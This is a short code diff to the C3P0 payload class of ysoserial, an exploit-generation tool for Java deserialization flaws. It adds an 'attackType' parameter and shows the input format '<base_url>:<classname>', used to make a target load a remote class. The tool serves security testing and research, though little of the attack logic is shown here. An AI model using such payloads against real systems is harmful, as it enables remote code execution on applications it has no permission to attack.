@@ -42,7 +42,7 @@ import ysoserial.payloads.util.Reflections;
 @Dependencies( { "com.mchange:c3p0:0.9.5.2" ,"com.mchange:mchange-commons-java:0.2.11"} )
 @Authors({ Authors.MBECHLER })
 public class C3P0 implements ObjectPayload<Object> {
-    public Object getObject ( String command ) throws Exception {
+    public Object getObject ( String command, String attackType) throws Exception {
         int sep = command.lastIndexOf(':');
         if ( sep < 0 ) {
             throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
